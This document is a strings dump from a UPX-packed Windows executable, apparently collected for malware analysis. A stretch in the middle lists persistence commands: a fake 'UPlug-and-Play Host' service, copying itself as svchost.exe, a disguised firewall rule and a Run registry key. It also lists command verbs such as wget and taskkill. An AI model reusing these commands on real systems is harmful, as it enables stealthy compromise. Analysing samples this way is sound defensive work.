Error parsing resource directory
[Strings]
nth  paddr      vaddr      len size section  type    string
6019 0x000493fd 0x00449ffd 4   6    UPX0     utf8    ̦/~\a blocks=Combining Diacritical Marks,Basic Latin
6020 0x0004944a 0x0044a04a 7   9    UPX0     utf8    YH1ͼvW\f blocks=Basic Latin,Greek and Coptic
6021 0x00049458 0x0044a058 4   6    UPX0     utf8    Ɗ(bB blocks=Latin Extended-B,Basic Latin
6022 0x00049498 0x0044a098 11  16   UPX0     utf8    ܖ?&\eѢmA\v櫝Lh blocks=Syriac,Basic Latin,Cyrillic,CJK Unified Ideographs
6023 0x000494c8 0x0044a0c8 4   6    UPX0     utf8    J(bW
6024 0x00049518 0x0044a118 4   6    UPX0     utf8    ܄}BM blocks=Syriac,Basic Latin
6025 0x0004954d 0x0044a14d 4   6    UPX0     utf8    ̶m@7 blocks=Combining Diacritical Marks,Basic Latin
6026 0x0004955d 0x0044a15d 4   6    UPX0     utf8    ˡv2b blocks=Spacing Modifier Letters,Basic Latin
6027 0x00049578 0x0044a178 4   6    UPX0     utf8    у~.r blocks=Cyrillic,Basic Latin
6028 0x00049595 0x0044a195 5   8    UPX0     utf8    `3撁}/ blocks=Basic Latin,CJK Unified Ideographs
6029 0x0004959d 0x0044a19d 4   6    UPX0     utf8    üf8! blocks=Latin-1 Supplement,Basic Latin
6030 0x000495b5 0x0044a1b5 5   8    UPX0     utf8    `3撁}/ blocks=Basic Latin,CJK Unified Ideographs
6031 0x000495bd 0x0044a1bd 4   6    UPX0     utf8    üf2b blocks=Latin-1 Supplement,Basic Latin
6032 0x000495ea 0x0044a1ea 7   9    UPX0     utf8    /BTǼaY\a blocks=Basic Latin,Latin Extended-B
6033 0x00049615 0x0044a215 5   8    UPX0     utf8    V!ꒃv4 blocks=Basic Latin,Yi Syllables
6034 0x0004966d 0x0044a26d 4   6    UPX0     utf8    ŽpKX blocks=Latin Extended-A,Basic Latin
6035 0x0004967d 0x0044a27d 4   6    UPX0     utf8    ˾w@\a blocks=Spacing Modifier Letters,Basic Latin
6036 0x000496b8 0x0044a2b8 8   11   UPX0     utf8    нdp\Ǫg2b blocks=Cyrillic,Basic Latin,Latin Extended-B
6037 0x000496df 0x0044a2df 4   6    UPX0     utf8    Ve#\a
6038 0x000496ec 0x0044a2ec 4   6    UPX0     utf8    \aҢm@ blocks=Basic Latin,Cyrillic
6039 0x00049708 0x0044a308 4   6    UPX0     utf8    ךw!C blocks=Hebrew,Basic Latin
6040 0x0004971d 0x0044a31d 4   6    UPX0     utf8    áiY\v blocks=Latin-1 Supplement,Basic Latin
6041 0x0004972d 0x0044a32d 4   6    UPX0     utf8    ǳpQ\n blocks=Latin Extended-B,Basic Latin
6042 0x0004974d 0x0044a34d 4   6    UPX0     utf8    ڦkBb blocks=Arabic,Basic Latin
6043 0x00049780 0x0044a380 5   8    UPX0     utf8    A\a村Ac blocks=Basic Latin,CJK Unified Ideographs
6044 0x000497ad 0x0044a3ad 4   6    UPX0     utf8    ˼f2b blocks=Spacing Modifier Letters,Basic Latin
6045 0x000497ed 0x0044a3ed 4   6    UPX0     utf8    ֳpF= blocks=Hebrew,Basic Latin
6046 0x000497fd 0x0044a3fd 4   6    UPX0     utf8    ֳpF= blocks=Hebrew,Basic Latin
6047 0x0004982d 0x0044a42d 7   9    UPX0     utf8    ǼIW\eExA blocks=Latin Extended-B,Basic Latin
6048 0x00049838 0x0044a438 15  16   UPX0     ascii   RegCreateKeyExA
6049 0x00049848 0x0044a448 14  15   UPX0     ascii   RegSetValueExA
6050 0x00049858 0x0044a458 11  12   UPX0     ascii   RegCloseKey
6051 0x00049864 0x0044a464 16  17   UPX0     ascii   RegQueryValueExA
6052 0x00049878 0x0044a478 16  17   UPX0     ascii   RegQueryValueExW
6053 0x0004988c 0x0044a48c 12  13   UPX0     ascii   OpenServiceA
6054 0x0004989c 0x0044a49c 24  25   UPX0     ascii   AllocateAndInitializeSid
6055 0x000498b8 0x0044a4b8 20  21   UPX0     ascii   CheckTokenMembership
6056 0x000498d0 0x0044a4d0 13  14   UPX0     ascii   StartServiceA
6057 0x000498e0 0x0044a4e0 7   8    UPX0     ascii   FreeSid
6058 0x000498e8 0x0044a4e8 20  21   UPX0     ascii   QueryServiceStatusEx
6059 0x00049900 0x0044a500 18  19   UPX0     ascii   CloseServiceHandle
6060 0x00049914 0x0044a514 27  28   UPX0     ascii   StartServiceCtrlDispatcherA
6061 0x00049930 0x0044a530 13  14   UPX0     ascii   CryptHashData
6062 0x00049940 0x0044a540 16  17   UPX0     ascii   CryptDestroyHash
6063 0x00049954 0x0044a554 15  16   UPX0     ascii   CryptDestroyKey
6064 0x00049964 0x0044a564 14  15   UPX0     ascii   ControlService
6065 0x00049974 0x0044a574 14  15   UPX0     ascii   OpenSCManagerA
6066 0x00049984 0x0044a584 15  16   UPX0     ascii   CryptCreateHash
6067 0x00049994 0x0044a594 12  13   UPX0     ascii   CryptEncrypt
6068 0x000499a4 0x0044a5a4 16  17   UPX0     ascii   SetServiceStatus
6069 0x000499b8 0x0044a5b8 20  21   UPX0     ascii   CryptAcquireContextA
6070 0x000499d0 0x0044a5d0 19  20   UPX0     ascii   CryptReleaseContext
6071 0x000499e4 0x0044a5e4 14  15   UPX0     ascii   CreateServiceA
6072 0x000499f4 0x0044a5f4 27  28   UPX0     ascii   RegisterServiceCtrlHandlerA
6073 0x00049a10 0x0044a610 21  22   UPX0     ascii   ChangeServiceConfig2A
6074 0x00049a28 0x0044a628 17  18   UPX0     ascii   CryptGetHashParam
6075 0x00049a3c 0x0044a63c 14  15   UPX0     ascii   RmStartSession
6076 0x00049a4c 0x0044a64c 19  20   UPX0     ascii   RmRegisterResources
6077 0x00049a60 0x0044a660 9   10   UPX0     ascii   RmGetList
6078 0x00049a6c 0x0044a66c 12  13   UPX0     ascii   RmEndSession
6079 0x00049a7c 0x0044a67c 7   8    UPX0     ascii   APPDATA
6080 0x00049a84 0x0044a684 22  23   UPX0     ascii   C:\Windows\svchost.exe
6081 0x00049a9c 0x0044a69c 14  15   UPX0     ascii   Already 2.52x\n
6082 0x00049aac 0x0044a6ac 14  15   UPX0     ascii   Already 2.53+\n
6083 0x00049ac4 0x0044a6c4 4   5    UPX0     ascii   SMB1
6084 0x00049acc 0x0044a6cc 57  58   UPX0     ascii   SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters
6085 0x00049b0c 0x0044a70c 18  19   UPX0     ascii   DisableCompression
6086 0x00049b20 0x0044a720 18  19   UPX0     ascii   UserAuthentication
6087 0x00049b38 0x0044a738 68  69   UPX0     ascii   SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp
6088 0x00049b80 0x0044a780 14  15   UPX0     ascii   SOFTWARE\Intel
6089 0x00049b90 0x0044a790 22  23   UPX0     ascii   SOFTWARE\Microsoft\Fax
6090 0x00049ba8 0x0044a7a8 17  18   UPX0     ascii   System Install...
6091 0x00049bbc 0x0044a7bc 12  13   UPX0     ascii   " C:\windows
6092 0x00049bcc 0x0044a7cc 12  13   UPX0     ascii   /C copy /y "
6093 0x00049bdc 0x0044a7dc 20  21   UPX0     ascii   cmd.exe /c sc query 
6094 0x00049bf4 0x0044a7f4 17  18   UPX0     ascii   WIN32_OWN_PROCESS
6095 0x00049c08 0x0044a808 49  50   UPX0     ascii    "Secure Socket Tunneling Protocol (HTTP)" ENABLE
6096 0x00049c3c 0x0044a83c 47  48   UPX0     ascii   " enable=yes&netsh firewall add allowedprogram 
6097 0x00049c70 0x0044a870 115 116  UPX0     ascii   /C netsh advfirewall firewall add rule name="Secure Socket Tunneling Protocol (HTTP)" dir=in action=allow program="
6098 0x00049ce8 0x0044a8e8 72  73   UPX0     ascii   " type= own DisplayName= "UPlug-and-Play Host" start= auto error= ignore
6099 0x00049d34 0x0044a934 53  54   UPX0     ascii   /C sc delete UPlugPlay&sc create UPlugPlay binPath= "
6100 0x00049d70 0x0044a970 113 114  UPX0     ascii   /C reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UPlugPlay" /v ImagePath /f /t REG_EXPAND_SZ /d "
6101 0x00049de4 0x0044a9e4 34  35   UPX0     ascii   /C sc config UPlugPlay start= auto
6102 0x00049e08 0x0044aa08 18  19   UPX0     ascii   /C ren C:\windows\
6103 0x00049e1c 0x0044aa1c 29  30   UPX0     ascii   cmd.exe /C sc start UPlugPlay
6104 0x00049e3c 0x0044aa3c 4   5    UPX0     ascii   OK!\n
6105 0x00049e44 0x0044aa44 7   8    UPX0     ascii   RUNNING
6106 0x00049e4c 0x0044aa4c 24  25   UPX0     ascii   Service Running Already\n
6107 0x00049e68 0x0044aa68 19  20   UPX0     ascii   Usermode Install...
6108 0x00049e80 0x0044aa80 45  46   UPX0     ascii   Software\Microsoft\Windows\CurrentVersion\Run
6109 0x00049eb0 0x0044aab0 65  66   UPX0     ascii   /C reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v 
6110 0x00049ef4 0x0044aaf4 14  15   UPX0     ascii    /t REG_SZ /d 
6111 0x00049f04 0x0044ab04 4   5    UPX0     ascii   " /f
6112 0x00049f0c 0x0044ab0c 9   10   UPX0     ascii   copy err\n
6113 0x00049f18 0x0044ab18 12  13   UPX0     ascii   GetAdmin>>>\n
6114 0x00049f28 0x0044ab28 8   9    UPX0     ascii   updated?
6115 0x00049f34 0x0044ab34 8   9    UPX0     ascii   watchdog
6116 0x00049f40 0x0044ab40 13  14   UPX0     ascii   SessionMgrSvc
6117 0x00049f50 0x0044ab50 9   10   UPX0     ascii   SmartCard
6118 0x00049f5c 0x0044ab5c 6   7    UPX0     ascii   xwget 
6119 0x00049f64 0x0044ab64 6   7    UPX0     ascii   saved\n
6120 0x00049f6c 0x0044ab6c 4   5    UPX0     ascii   err\n
6121 0x00049f74 0x0044ab74 8   9    UPX0     ascii   already\n
6122 0x00049f80 0x0044ab80 9   10   UPX0     ascii   chkxwget 
6123 0x00049f8c 0x0044ab8c 5   6    UPX0     ascii   EQU,\n
6124 0x00049f94 0x0044ab94 7   8    UPX0     ascii   NotEQU\n
6125 0x00049f9c 0x0044ab9c 9   10   UPX0     ascii   hash: %s\n
6126 0x00049fa8 0x0044aba8 9   10   UPX0     ascii   bad file\n
6127 0x00049fb4 0x0044abb4 5   6    UPX0     ascii   fail\n
6128 0x00049fbc 0x0044abbc 5   6    UPX0     ascii   wget 
6129 0x00049fc4 0x0044abc4 13  14   UPX0     ascii   taskkillpath 
6130 0x00049fd4 0x0044abd4 7   8    UPX0     ascii   ver:%s\n
6131 0x00049fdc 0x0044abdc 5   6    UPX0     ascii   tasks
6132 0x00049fe4 0x0044abe4 9   10   UPX0     ascii   tasks\n%s\n
6133 0x00049ff0 0x0044abf0 6   7    UPX0     ascii   id:%s\n
6134 0x00049ff8 0x0044abf8 8   9    UPX0     ascii   sha1chk 
6135 0x0004a004 0x0044ac04 4   5    UPX0     ascii   EQU\n
6136 0x0004a00c 0x0044ac0c 11  12   UPX0     ascii   File exist!
6137 0x0004a02c 0x0044ac2c 23  24   UPX0     ascii   invalid string position
6138 0x0004a04c 0x0044ac4c 15  16   UPX0     ascii   string too long
6139 0x0004a05c 0x0044ac5c 8   9    UPX0     ascii   bad cast
6140 0x0004a0ad 0x0044acad 5   6    UPX0     ascii   }\fUt]
6141 0x0004a0cc 0x0044accc 5   7    UPX0     utf8    ̡\f$o, blocks=Combining Diacritical Marks,Basic Latin
6142 0x0004a0df 0x0044acdf 4   5    UPX0     ascii   vRQ>
6143 0x0004a103 0x0044ad03 5   6    UPX0     ascii   '8!\e.
6144 0x0004a10d 0x0044ad0d 7   8    UPX0     ascii   \r8STs\ne
6145 0x0004a115 0x0044ad15 4   5    UPX0     ascii   \njv.
6146 0x0004a12a 0x0044ad2a 4   6    UPX0     utf8    K£Ql blocks=Basic Latin,Latin-1 Supplement
6147 0x0004a148 0x0044ad48 4   5    UPX0     ascii   LwH'
6148 0x0004a157 0x0044ad57 4   6    UPX0     utf8    NOʜ[ blocks=Basic Latin,IPA Extensions
6149 0x0004a15d 0x0044ad5d 7   10   UPX0     utf8    o.htoc blocks=Basic Latin,Private Use Area
6150 0x0004a1db 0x0044addb 5   6    UPX0     ascii   raB3G
6151 0x0004c460 0x0044d060 4   6    UPX0     utf8     b%Å blocks=Basic Latin,Latin-1 Supplement
6152 0x0004c763 0x0044d363 5   8    UPX0     utf8    ￏ_/\bc blocks=Halfwidth and Fullwidth Forms,Basic Latin
6153 0x0004cd10 0x0044d910 4   6    UPX0     utf8    Pa2Ô blocks=Basic Latin,Latin-1 Supplement
6154 0x0004cefe 0x0044dafe 4   6    UPX0     utf8    ŶgX\t blocks=Latin Extended-A,Basic Latin
6155 0x0004cf20 0x0044db20 4   6    UPX0     utf8    Gx)ڋ blocks=Basic Latin,Arabic
6156 0x0004cfc4 0x0044dbc4 5   6    UPX0     ascii   `)dP$
6157 0x0004cfcf 0x0044dbcf 4   5    UPX0     ascii   R!0`
6158 0x0004cfd6 0x0044dbd6 4   5    UPX0     ascii    P&o
6159 0x0004cffe 0x0044dbfe 5   6    UPX0     ascii   zs 0`
6160 0x0004d02e 0x0044dc2e 5   6    UPX0     ascii   zs 0`
6161 0x0004d063 0x0044dc63 5   6    UPX0     ascii   2(R{P
6162 0x0004d08f 0x0044dc8f 5   6    UPX0     ascii   \n 0?J
6163 0x0004d0c6 0x0044dcc6 4   6    UPX0     utf8    dP$ߤ blocks=Basic Latin,NKo
6164 0x0004d0d6 0x0044dcd6 4   6    UPX0     utf8    dP4ߤ blocks=Basic Latin,NKo
6165 0x0004d0e6 0x0044dce6 4   6    UPX0     utf8    dPPߤ blocks=Basic Latin,NKo
6166 0x0004d0f6 0x0044dcf6 4   6    UPX0     utf8    dP|ߤ blocks=Basic Latin,NKo
6167 0x0004d166 0x0044dd66 4   6    UPX0     utf8    dP<$
6168 0x0004d176 0x0044dd76 4   6    UPX0     utf8    dPP$
6169 0x0004d186 0x0044dd86 4   6    UPX0     utf8    dPp$
6170 0x0004d1c6 0x0044ddc6 4   6    UPX0     utf8    dP4d
6171 0x0004d1d6 0x0044ddd6 4   6    UPX0     utf8    dPTd
6172 0x0004d216 0x0044de16 4   6    UPX0     utf8    dP0¤ blocks=Basic Latin,Latin-1 Supplement
6173 0x0004d2e4 0x0044dee4 6   7    UPX0     ascii   `)dP~O
6174 0x0004d43c 0x0044e03c 4   5    UPX0     ascii   @pX/
6175 0x0004d566 0x0044e166 4   5    UPX0     ascii    PpA
6176 0x0004d614 0x0044e214 6   7    UPX0     ascii   .McPn\r
6177 0x0004d624 0x0044e224 6   7    UPX0     ascii   .McPn\r
6178 0x0004d634 0x0044e234 4   5    UPX0     ascii   .McP
6179 0x0004d6ee 0x0044e2ee 5   6    UPX0     ascii   _/50`
6180 0x0004d798 0x0044e398 4   5    UPX0     ascii   m|.\v
6181 0x0004d7d9 0x0044e3d9 4   5    UPX0     ascii   r3P/
6182 0x0004d7eb 0x0044e3eb 6   7    UPX0     ascii   EgI-'p
6183 0x0004d867 0x0044e467 5   6    UPX0     ascii   \r\tI;w
6184 0x0004d886 0x0044e486 6   8    UPX0     utf8     PM|-܌ blocks=Basic Latin,Syriac
6185 0x0004d8a0 0x0044e4a0 4   5    UPX0     ascii   ZT[O
6186 0x0004d8d8 0x0044e4d8 4   5    UPX0     ascii   ?f\a/
6187 0x0004d8f4 0x0044e4f4 4   5    UPX0     ascii   R4sk
6188 0x0004d90a 0x0044e50a 6   7    UPX0     ascii   t/dSf2
6189 0x0004d973 0x0044e573 7   8    UPX0     ascii   sFV#kF4
6190 0x0004d9a3 0x0044e5a3 4   6    UPX0     utf8    ԙG0| blocks=Cyrillic Supplement,Basic Latin
6191 0x0004d9ab 0x0044e5ab 4   7    UPX0     utf8    =vD blocks=Basic Latin,Private Use Area
6192 0x0004d9b8 0x0044e5b8 4   5    UPX0     ascii   @n"m
6193 0x0004d9d5 0x0044e5d5 4   5    UPX0     ascii   d]Ad
6194 0x0004da1e 0x0044e61e 4   6    UPX0     utf8    Եl0` blocks=Armenian,Basic Latin
6195 0x0004da26 0x0044e626 6   9    UPX0     utf8    L%睁~$] blocks=Basic Latin,CJK Unified Ideographs
6196 0x0004da30 0x0044e630 4   6    UPX0     utf8    aI@د blocks=Basic Latin,Arabic
6197 0x0004da3e 0x0044e63e 4   6    UPX0     utf8    ~MQ\t
6198 0x0004da60 0x0044e660 4   6    UPX0     utf8    C\n<ǩ blocks=Basic Latin,Latin Extended-B
6199 0x0004daab 0x0044e6ab 7   9    UPX0     utf8    y4^̿g0` blocks=Basic Latin,Combining Diacritical Marks
6200 0x0004dac0 0x0044e6c0 6   9    UPX0     utf8    /s@ਫ਼Gp blocks=Basic Latin,Gurmukhi
6201 0x0004dad0 0x0044e6d0 4   6    UPX0     utf8    C\n<ǩ blocks=Basic Latin,Latin Extended-B
6202 0x0004dae9 0x0044e6e9 8   11   UPX0     utf8    Ȕ63\tӤe]\t blocks=Latin Extended-B,Basic Latin,Cyrillic
6203 0x0004dafe 0x0044e6fe 5   8    UPX0     utf8    ĿwC<ĥ blocks=Latin Extended-A,Basic Latin
6204 0x0004db20 0x0044e720 4   6    UPX0     utf8    I~@Ӆ blocks=Basic Latin,Cyrillic
6205 0x0004db3d 0x0044e73d 4   6    UPX0     utf8    #їSy blocks=Basic Latin,Cyrillic
6206 0x0004db50 0x0044e750 4   6    UPX0     utf8    At#ҩ blocks=Basic Latin,Cyrillic
6207 0x0004db90 0x0044e790 4   6    UPX0     utf8    JZ6° blocks=Basic Latin,Latin-1 Supplement
6208 0x0004dbad 0x0044e7ad 5   8    UPX0     utf8    \eȖbeR blocks=Basic Latin,Latin Extended-B
6209 0x0004dbb9 0x0044e7b9 11  16   UPX0     utf8    Ƈ^pHʹq~\n禒t? blocks=Latin Extended-B,Basic Latin,Greek and Coptic,CJK Unified Ideographs
6210 0x0004dbcb 0x0044e7cb 5   7    UPX0     utf8    ;s!ȴy blocks=Basic Latin,Latin Extended-B
6211 0x0004dc0b 0x0044e80b 5   7    UPX0     utf8    R1Fբq blocks=Basic Latin,Armenian
6212 0x0004dc20 0x0044e820 4   6    UPX0     utf8    Aq!с blocks=Basic Latin,Cyrillic
6213 0x0004dc40 0x0044e840 4   6    UPX0     utf8    Is!ą blocks=Basic Latin,Latin Extended-A
6214 0x0004dc50 0x0044e850 6   9    UPX0     utf8    C\n<穞D? blocks=Basic Latin,CJK Unified Ideographs
6215 0x0004dd9d 0x0044e99d 4   6    UPX0     utf8    <ϳi] blocks=Basic Latin,Greek and Coptic
6216 0x0004ddee 0x0044e9ee 4   6    UPX0     utf8    Դ@p` blocks=Armenian,Basic Latin
6217 0x0004de0e 0x0044ea0e 4   6    UPX0     utf8    Đ@0` blocks=Latin Extended-A,Basic Latin
6218 0x0004de2e 0x0044ea2e 4   6    UPX0     utf8    Դ@p` blocks=Armenian,Basic Latin
6219 0x0004de4e 0x0044ea4e 4   6    UPX0     utf8    Դ@p` blocks=Armenian,Basic Latin
6220 0x0004debe 0x0044eabe 4   6    UPX0     utf8    Đ@0` blocks=Latin Extended-A,Basic Latin
6221 0x0004dede 0x0044eade 4   6    UPX0     utf8    ¥fp$ blocks=Latin-1 Supplement,Basic Latin
6222 0x0004deee 0x0044eaee 5   8    UPX0     utf8    ɤsp$г blocks=IPA Extensions,Basic Latin,Cyrillic
6223 0x0004df0d 0x0044eb0d 4   6    UPX0     utf8    T±sY blocks=Basic Latin,Latin-1 Supplement
6224 0x0004df2d 0x0044eb2d 6   9    UPX0     utf8    0Ӥdp г blocks=Basic Latin,Cyrillic
6225 0x0004df4e 0x0044eb4e 4   6    UPX0     utf8    ÏfY\f blocks=Latin-1 Supplement,Basic Latin
6226 0x0004dfa9 0x0044eba9 4   6    UPX0     utf8    Ճf40 blocks=Armenian,Basic Latin
6227 0x0004dfb3 0x0044ebb3 4   8    UPX0     utf8    䤰`PЈ blocks=CJK Unified Ideographs Extension A,Basic Latin,Cyrillic
6228 0x0004dfce 0x0044ebce 4   6    UPX0     utf8    Ӑ_g5 blocks=Cyrillic,Basic Latin
6229 0x0004dfde 0x0044ebde 5   8    UPX0     utf8    ԣ@o7г blocks=Cyrillic Supplement,Basic Latin,Cyrillic
6230 0x0004dffd 0x0044ebfd 4   6    UPX0     utf8    T±sY blocks=Basic Latin,Latin-1 Supplement
6231 0x0004e009 0x0044ec09 4   6    UPX0     utf8    ݂e&0 blocks=Syriac,Basic Latin
6232 0x0004e03d 0x0044ec3d 4   6    UPX0     utf8    T±sY blocks=Basic Latin,Latin-1 Supplement
6233 0x0004e07e 0x0044ec7e 4   6    UPX0     utf8    ÏfY\f blocks=Latin-1 Supplement,Basic Latin
6234 0x0004e0a3 0x0044eca3 4   8    UPX0     utf8    䤰`PЈ blocks=CJK Unified Ideographs Extension A,Basic Latin,Cyrillic
6235 0x0004e0b9 0x0044ecb9 4   6    UPX0     utf8    Ճf40 blocks=Armenian,Basic Latin
6236 0x0004e0c0 0x0044ecc0 5   8    UPX0     utf8    Dx 㴔` blocks=Basic Latin,CJK Unified Ideographs Extension A
6237 0x0004e0de 0x0044ecde 4   6    UPX0     utf8    ҢoB  blocks=Cyrillic,Basic Latin
6238 0x0004e0f9 0x0044ecf9 4   6    UPX0     utf8    َv/0 blocks=Arabic,Basic Latin
6239 0x0004e12d 0x0044ed2d 6   9    UPX0     utf8    #٣tU\rϥ blocks=Basic Latin,Arabic,Greek and Coptic
6240 0x0004e14b 0x0044ed4b 7   9    UPX0     utf8    F3\tӤe]? blocks=Basic Latin,Cyrillic
6241 0x0004e193 0x0044ed93 4   8    UPX0     utf8    䤰`PЈ blocks=CJK Unified Ideographs Extension A,Basic Latin,Cyrillic
6242 0x0004e1ab 0x0044edab 6   8    UPX0     utf8    q-/Ţr_ blocks=Basic Latin,Latin Extended-A
6243 0x0004e1be 0x0044edbe 4   6    UPX0     utf8    Դ@p` blocks=Armenian,Basic Latin
6244 0x0004e223 0x0044ee23 4   8    UPX0     utf8    䤰`PЈ blocks=CJK Unified Ideographs Extension A,Basic Latin,Cyrillic
6245 0x0004e23d 0x0044ee3d 5   7    UPX0     utf8    0Ӥdp  blocks=Basic Latin,Cyrillic
6246 0x0004e25c 0x0044ee5c 6   8    UPX0     utf8    2/ñtU\a blocks=Basic Latin,Latin-1 Supplement
6247 0x0004e269 0x0044ee69 4   6    UPX0     utf8    ԠP@p blocks=Cyrillic Supplement,Basic Latin
6248 0x0004e27d 0x0044ee7d 4   6    UPX0     utf8    TΥm@ blocks=Basic Latin,Greek and Coptic
6249 0x0004e2f0 0x0044eef0 5   8    UPX0     utf8    rQ\t䳰d blocks=Basic Latin,CJK Unified Ideographs Extension A
6250 0x0004e2fd 0x0044eefd 6   9    UPX0     utf8    0Ӥdp г blocks=Basic Latin,Cyrillic
6251 0x00085418 0x01c52018 5   6    UPX1     ascii   TSVWj
6252 0x00085429 0x01c52029 4   5    UPX1     ascii   C:\W
6253 0x00085442 0x01c52042 4   5    UPX1     ascii   indo
6254 0x00085453 0x01c52053 4   5    UPX1     ascii   ws\m
6255 0x00085464 0x01c52064 4   5    UPX1     ascii   shlp
6256 0x0008547b 0x01c5207b 4   5    UPX1     ascii   da32
6257 0x00085496 0x01c52096 4   5    UPX1     ascii   .dll
6258 0x0008566e 0x01c5226e 4   5    UPX1     ascii   vali
6259 0x00085678 0x01c52278 4   5    UPX1     ascii   d co
6260 0x0008569e 0x01c5229e 5   8    UPX1     utf8    +ǉE؋E blocks=Basic Latin,Latin Extended-B,Arabic
6261 0x0008578c 0x01c5238c 4   6    UPX1     utf8    M؉P\f blocks=Basic Latin,Arabic
6262 0x00085882 0x01c52482 4   5    UPX1     ascii   PQh8
6263 0x00087409 0x01c54009 20  21   UPX1     ascii   SetHandleInformation
6264 0x0008741f 0x01c5401f 19  20   UPX1     ascii   WaitForSingleObject
6265 0x00087434 0x01c54034 8   9    UPX1     ascii   SetEvent
6266 0x0008743e 0x01c5403e 12  13   UPX1     ascii   GetTickCount
6267 0x0008744c 0x01c5404c 14  15   UPX1     ascii   GetProcessHeap
6268 0x0008745c 0x01c5405c 9   10   UPX1     ascii   WriteFile
6269 0x00087467 0x01c54067 14  15   UPX1     ascii   GetSystemTimes
6270 0x00087477 0x01c54077 13  14   UPX1     ascii   GetDriveTypeA
6271 0x00087486 0x01c54086 15  16   UPX1     ascii   GetProcessTimes
6272 0x00087497 0x01c54097 11  12   UPX1     ascii   OpenProcess
6273 0x000874a4 0x01c540a4 11  12   UPX1     ascii   GlobalAlloc
6274 0x000874b1 0x01c540b1 19  20   UPX1     ascii   WideCharToMultiByte
6275 0x000874c6 0x01c540c6 15  16   UPX1     ascii   TerminateThread
6276 0x000874d7 0x01c540d7 37  38   UPX1     ascii   InitializeCriticalSectionAndSpinCount
6277 0x000874fe 0x01c540fe 5   6    UPX1     ascii   Sleep
6278 0x00087505 0x01c54105 12  13   UPX1     ascii   CreateEventA
6279 0x00087513 0x01c54113 20  21   UPX1     ascii   LeaveCriticalSection
6280 0x00087529 0x01c54129 18  19   UPX1     ascii   GetComputerNameExA
6281 0x0008753d 0x01c5413d 14  15   UPX1     ascii   CreateProcessA
6282 0x0008754d 0x01c5414d 16  17   UPX1     ascii   TerminateProcess
6283 0x0008755f 0x01c5415f 20  21   UPX1     ascii   FileTimeToSystemTime
6284 0x00087575 0x01c54175 8   9    UPX1     ascii   ReadFile
6285 0x0008757f 0x01c5417f 18  19   UPX1     ascii   GetModuleFileNameW
6286 0x00087593 0x01c54193 11  12   UPX1     ascii   CreateFileW
6287 0x000875a0 0x01c541a0 19  20   UPX1     ascii   MultiByteToWideChar
6288 0x000875b5 0x01c541b5 14  15   UPX1     ascii   RaiseException
6289 0x000875c5 0x01c541c5 16  17   UPX1     ascii   CreateDirectoryA
6290 0x000875d7 0x01c541d7 20  21   UPX1     ascii   SetCurrentDirectoryA
6291 0x000875ed 0x01c541ed 14  15   UPX1     ascii   FindFirstFileA
6292 0x000875fd 0x01c541fd 12  13   UPX1     ascii   GetLastError
6293 0x0008760b 0x01c5420b 12  13   UPX1     ascii   SetLastError
6294 0x00087619 0x01c54219 14  15   UPX1     ascii   Process32First
6295 0x00087629 0x01c54229 8   9    UPX1     ascii   HeapSize
6296 0x00087633 0x01c54233 9   10   UPX1     ascii   CopyFileA
6297 0x0008763e 0x01c5423e 20  21   UPX1     ascii   EnterCriticalSection
6298 0x00087654 0x01c54254 9   10   UPX1     ascii   FindClose
6299 0x0008765f 0x01c5425f 12  13   UPX1     ascii   LoadLibraryA
6300 0x0008766d 0x01c5426d 13  14   UPX1     ascii   Process32Next
6301 0x0008767c 0x01c5427c 13  14   UPX1     ascii   DecodePointer
6302 0x0008768b 0x01c5428b 13  14   UPX1     ascii   GetSystemInfo
6303 0x0008769a 0x01c5429a 10  11   UPX1     ascii   CreatePipe
6304 0x000876a6 0x01c542a6 18  19   UPX1     ascii   GetModuleFileNameA
6305 0x000876ba 0x01c542ba 13  14   UPX1     ascii   FindNextFileA
6306 0x000876c9 0x01c542c9 16  17   UPX1     ascii   GetModuleHandleA
6307 0x000876db 0x01c542db 13  14   UPX1     ascii   FindNextFileW
6308 0x000876ea 0x01c542ea 20  21   UPX1     ascii   GetCurrentDirectoryA
6309 0x00087700 0x01c54300 24  25   UPX1     ascii   CreateToolhelp32Snapshot
6310 0x0008771a 0x01c5431a 21  22   UPX1     ascii   DeleteCriticalSection
6311 0x00087731 0x01c54331 19  20   UPX1     ascii   GetDiskFreeSpaceExA
6312 0x00087746 0x01c54346 13  14   UPX1     ascii   GetVersionExA
6313 0x00087755 0x01c54355 11  12   UPX1     ascii   CloseHandle
6314 0x00087762 0x01c54362 11  12   UPX1     ascii   DeleteFileW
